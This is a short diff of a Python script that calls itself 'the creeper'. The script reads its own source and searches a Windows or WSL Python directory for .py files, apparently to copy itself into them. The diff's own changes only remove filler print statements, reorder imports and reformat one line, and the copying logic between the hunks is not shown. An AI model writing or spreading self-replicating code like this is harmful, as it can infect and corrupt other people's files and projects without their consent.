@@ -1,17 +1,6 @@
-print("Some Code")
-print("Some Code")
-print("Some Code")
-print("Some Code")
-print("Some Code")
-print("Some Code")
-print("Some Code")
-print("Some Code")
-print("Some Code")
-print("Some Code\n")
-
 # ========I'm the creeper:========
-import sys
 import os
+import sys
 
 with open(sys.argv[0], "r") as file:
     replicate = file.readlines()
@@ -41,7 +30,8 @@ def find(pattern, path):
 if 'nt' in os.name:
     path, copyFile = find(".py", "D:\\Program\\Python3.7")        # Windows
 else:
-    path, copyFile = find(".py", "/mnt/d/Program/Python3.7")  # For WSL
+    path, copyFile = find(
+        ".py", "/mnt/d/Program/Python3.7")  # For WSL
 print("Path -- ", path)
 
 if path:
